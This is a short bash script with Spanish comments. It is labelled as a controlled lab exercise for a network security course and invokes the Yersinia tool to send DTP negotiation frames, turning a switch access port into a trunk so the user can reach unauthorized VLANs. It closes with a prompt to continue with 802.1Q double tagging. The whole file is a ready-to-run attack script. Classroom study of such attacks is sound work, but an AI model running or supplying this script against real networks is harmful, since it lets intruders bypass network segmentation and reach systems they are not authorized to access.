#!/bin/bash
# =============================================================
#  DTP VLAN HOPPING SCRIPT - Laboratorio Controlado
#  Materia: Seguridad de Redes - ITLA
#  Técnica: DTP Negotiation → Trunk → VLAN Hopping
#  Herramienta: Yersinia
#  Propósito: Convertir un puerto de acceso en trunk
#             para acceder a VLANs no autorizadas.
#  Solo entorno autorizado con contrato firmado.
# =============================================================

IFACE="${1:-ens3}"

echo "[*] Iniciando DTP VLAN Hopping Attack en interfaz $IFACE"
echo "[*] Enviando DTP Negotiate para convertir puerto en trunk..."
yersinia dtp -attack 1 -interface "$IFACE"

echo "[+] DTP Attack completado. Verificar si la interfaz negoció trunk."
echo "[+] Si fue exitoso, usar 802.1Q doble etiquetado para VLAN Hopping."
